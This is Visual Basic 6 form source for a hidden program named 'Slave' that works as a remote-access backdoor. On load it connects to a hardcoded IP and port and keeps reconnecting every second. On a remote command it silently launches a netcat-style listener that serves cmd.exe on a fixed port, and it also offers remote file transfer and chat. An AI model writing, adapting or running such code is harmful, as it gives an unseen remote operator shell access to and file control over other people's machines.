VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMain 
   Caption         =   "Slave"
   ClientHeight    =   3195
   ClientLeft      =   165
   ClientTop       =   735
   ClientWidth     =   4680
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   2880
      Top             =   2520
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   3480
      Top             =   2520
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Menu mMain 
      Caption         =   "&Main"
      Begin VB.Menu mChat 
         Caption         =   "&Chat"
      End
      Begin VB.Menu mExit 
         Caption         =   "E&xit"
         Visible         =   0   'False
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private SolidIcon As Boolean
Private hTransIcon As Long
Dim bOK As Boolean
Dim fname As String
Dim lPost As Long

Const serverIP = "161.246.5.17"
Const serverPort = 43370

Private Sub AddTrayIcon()
    If OldWindowProc <> 0 Then
        ' We have already added a tray icon!
        RemoveTrayIcon
    End If

    Dim nid As NOTIFYICONDATA
    
    ' nid.cbSize is always Len(nid)
    nid.cbSize = Len(nid)
    ' Parent window - this is the window that will process the icon events
    'nid.hWnd = frmSystray.hWnd
    nid.hWnd = frmMain.hWnd
    ' Icon identifier
    nid.uID = 0
    ' We want to receive messages, show the icon and have a tooltip
    nid.uFlags = NIF_MESSAGE Or NIF_ICON Or NIF_TIP
    ' The message we will receive on an icon event
    nid.uCallbackMessage = 1024
    ' The icon to display
    'nid.hIcon = frmSystray.Icon
    nid.hIcon = frmMain.Icon
    ' Our tooltip
    nid.szTip = "Always terminate the tooltip with vbNullChar" & vbNullChar
  
    ' Add the icon to the System Tray
    Shell_NotifyIconA NIM_ADD, nid
    
    ' Set our WindowProc as the event handler for frmSystray.
    ' Save the address of the old handler in OldWindowProc
    OldWindowProc = SetWindowLongA(Me.hWnd, GWL_WNDPROC, AddressOf WindowProc)
    
    SolidIcon = True ' the icon is displayed - not transparent
    'cmdAddIcon.Enabled = False
    'cmdRemoveIcon.Enabled = True
    'cmdFlashIcon.Enabled = True
End Sub

Private Sub RemoveTrayIcon()
    Dim nid As NOTIFYICONDATA

    nid.hWnd = Me.hWnd
    nid.cbSize = Len(nid)
    nid.uID = 0 ' The icon identifier we set earlier

    ' Delete the icon
    Shell_NotifyIconA NIM_DELETE, nid

    If OldWindowProc <> 0 Then
        ' Set the window event handler to the previous
        SetWindowLongA Me.hWnd, GWL_WNDPROC, OldWindowProc
        OldWindowProc = 0
    End If
    'tmrFlash.Enabled = False
    'cmdRemoveIcon.Enabled = False
    'cmdFlashIcon.Enabled = False
    'cmdAddIcon.Enabled = True
End Sub

Private Sub Form_Load()
    
    hTransIcon = frmMain.Icon
    AddTrayIcon
    frmMain.Winsock1.Connect serverIP, serverPort
    'frmMain.Winsock2.Close
    bOK = False
    'frmFTP.Show

End Sub

Private Sub Form_Unload(Cancel As Integer)
    'tmrFlash.Enabled = False
    DeleteObject hTransIcon
    RemoveTrayIcon
End Sub

Private Sub mChat_Click()
    If frmMain.Winsock1.State = sckConnected Then
        frmMain.Winsock1.SendData "ChatReady"
        frmChat.Show
        'Winsock1.SendData "ChatReady"
    End If
End Sub

Private Sub mExit_Click()
    Unload Me
End Sub

Private Sub Timer1_Timer()
    If Winsock1.State <> sckConnected Then
        Winsock1.Close
        Winsock1.Connect serverIP, serverPort
    End If
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)

    Dim dataStr As String
    Winsock1.GetData dataStr
    If dataStr = "Chat" Then
        frmChat.Show
    ElseIf dataStr = "cmdControl" Then
        Shell "cmdctrl.exe -l -p 43372 -e cmd.exe", vbHide
        Winsock1.SendData "cmdControlReady"
    ElseIf dataStr = "FileTransfer" Then
        frmFTP.Show
        'frmFTP.cmdRun.Caption = "Run"
        'Call frmFTP.cmdRun_Click
    ElseIf dataStr = "ExitFileTransfer" Then
        Unload frmFTP
    End If

End Sub
